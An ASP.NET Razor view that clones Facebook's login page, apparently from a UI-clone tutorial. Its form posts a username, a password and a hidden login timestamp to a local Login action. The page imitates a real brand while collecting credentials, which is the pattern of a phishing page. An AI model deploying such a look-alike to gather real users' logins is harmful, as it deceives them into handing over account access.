@{
    Layout = null;
}

@model SocialMediaLogin

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login Page | CodingNepal</title>
    <link rel="stylesheet" href="~/css/facebook.css">  
</head>
<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <h1>facebook</h1>
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form class="login-form" method="post" asp-action="Login">
                <div class="field">
                    <input asp-for="UserTerm" id="username"
                           type="text" placeholder="Phone number, username, or email" />                    
                </div>
                <div class="field">
                    <input type="hidden" asp-for="LoginDate" value="@DateTime.Now" />
                    <input asp-for="Password" id="password" type="password" placeholder="password" />
                  
                </div>
                <div>
                    <div style="display: flex; flex-direction: column; align-items: center; text-align: center;">
                        <button type="submit" style="width: 360px; background-color: #007bff; color: #fff; font-size: 18px; padding: 10px 20px; border: none; border-radius: 5px; margin-bottom: 10px;">Login</button>
                        <a href="#" class="forgot">Forgot password?</a>
                    </div>

                    <hr>
                    <div class="button">
                        <a href="#">Create new account</a>
                    </div>
                </div>
            </form>
        </div>
    </div>
</body>
</html>